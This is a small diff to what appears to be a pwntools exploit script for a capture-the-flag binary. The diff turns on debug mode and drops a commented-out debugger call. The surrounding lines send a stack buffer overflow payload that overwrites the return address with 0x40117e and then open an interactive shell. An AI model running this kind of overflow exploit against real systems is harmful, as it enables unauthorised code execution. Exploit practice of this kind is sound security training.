@@ -3,7 +3,7 @@ from pwn import *
 context.log_level = 'debug'
 context.terminal = ["/usr/bin/tmux", "sp", "-h"]
 
-debug = False
+debug = True
 
 elf = ELF("./vuln")
 if debug:
@@ -16,8 +16,6 @@ def tdebug():
     gdb.attach(io)
     pause()
 
-
-#tdebug()
 
 io.sendline(b'a' * 8 * 3 + p64(0x40117e))
 io.interactive()
